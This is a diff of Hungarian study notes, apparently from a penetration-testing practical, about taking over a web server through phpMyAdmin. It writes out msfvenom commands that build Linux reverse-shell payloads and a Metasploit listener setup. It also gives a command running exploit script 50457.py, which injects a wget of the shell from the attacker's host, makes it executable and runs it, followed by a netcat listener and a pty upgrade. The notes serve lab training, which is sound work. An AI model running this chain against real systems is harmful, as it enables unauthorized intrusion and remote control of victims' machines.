@@ -81,7 +81,7 @@ msfconsole > use exploit/multi/handler // ez csak listener
 set payload php/meterpreter/reverse_tcp
 run // olyan mint a netcates listener
 
-6.gyak
+**6.gyak
 thecartpress 
 exploit-db.com
 zh-n verzióban feljebb lehet menni de lejebb nem
@@ -100,6 +100,7 @@ weboldal "feltörése":
     1 fázisú payloadot (stageless) 
     (METERPRETER msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=30.0.1.11 LPORT=4444 -f elf > kriszshell.elf)
     (NON METERPRETER msfvenom -p linux/x64/shell_reverse_tcp LHOST=30.0.1.11 LPORT=4444 -f elf > kriszshell.elf)
+    ez a downloads mappába lesz valószínűleg, majd csinálunk egy listenert
   2.Célpont keresek egy mappát amin van írási jogom (tmp mappa linuxon, windowson temp) 
     a, belépünk a /tmp mappába a célgépen
     b, kitöröljük az előző / már ott lévő shell(eket)
@@ -107,11 +108,12 @@ weboldal "feltörése":
       Fájlmásolás Támadóról Cépontra  
       a, támadón belépek abba a mappába ahol a shell/fájl van
       b, python3 -m http.server [PORT] (opcionális a port)
+      d, futtathatóvá tesszük a shellt 
+      ez a kód az előzőekből (2. pontból): 
       python3 50457.py 40.0.5.10 80 /phpmyadmin pma pmapass "cd /tmp;rm -rf kriszshell.elf;wget http://30.0.1.11:8000/kriszshell.elf;chmod 777     /tmp/kriszshell.elf;/tmp/kriszshell.elf"
-    d, futtathatóvá tesszük a shellt 
-    e, listener a saját gépünkön  nc -lvnp 4444
-    f, futtatás
-python3 -c "import pty;pty.spawn('/bin/bash')"
+      e, interaktívvá tesszük a listenert python3 -c "import pty;pty.spawn('/bin/bash')"
+      (ha ctrl+c zel akkor a listenert leállítjuk és a python3-as 50457.py kódot újra futtatjuk)
+      f, futtatás 
 
 
 
